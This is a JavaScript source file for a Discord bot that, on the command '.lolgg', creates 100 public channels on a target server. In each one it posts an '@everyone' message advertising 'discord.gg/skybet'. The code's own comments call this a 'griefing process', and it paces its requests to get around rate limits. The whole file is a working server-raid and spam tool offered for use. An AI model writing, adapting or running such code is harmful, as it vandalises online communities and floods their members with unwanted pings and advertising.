const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
require('dotenv').config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Bot configuration from environment variables
const config = {
  token: process.env.DISCORD_TOKEN,
  targetServerId: process.env.TARGET_SERVER_ID,
  channelsToCreate: 100,
  channelName: 'discord.gg/skybet',
  messageContent: '@everyone discord.gg/skybet',
  command: '.lolgg'
};

// Track if the griefing process is active
let isGriefing = false;

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  console.log('Bot is ready to execute commands');
});

client.on('messageCreate', async message => {
  // Check if the message is the command to start griefing
  if (message.content === config.command && !isGriefing) {
    // Check if the user has admin permissions
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = true;
    message.channel.send('Starting griefing process...');
    
    // Get the target server
    const guild = client.guilds.cache.get(config.targetServerId) || message.guild;
    
    if (!guild) {
      message.channel.send('Could not find the target server.');
      isGriefing = false;
      return;
    }
    
    try {
      // Create channels and send messages
      await createChannelsAndSpam(guild);
      message.channel.send('Griefing process completed.');
    } catch (error) {
      console.error('Error during griefing:', error);
      message.channel.send('An error occurred during the griefing process.');
    } finally {
      isGriefing = false;
    }
  }
});

async function createChannelsAndSpam(guild) {
  const promises = [];
  
  // Create multiple channels with spam messages
  for (let i = 0; i < config.channelsToCreate; i++) {
    promises.push(
      guild.channels.create({
        name: `${config.channelName}-${i}`,
        type: 0, // Text channel
        permissionOverwrites: [
          {
            id: guild.id,
            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages]
          }
        ]
      }).then(channel => {
        // Send spam message to the newly created channel
        return channel.send(config.messageContent);
      }).catch(err => console.error(`Failed to create channel ${i}:`, err))
    );
    
    // Add a small delay to avoid rate limiting
    if (i % 10 === 0) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  // Wait for all channel creation to complete
  await Promise.all(promises);
}

// Login to Discord with your bot token
client.login(config.token);
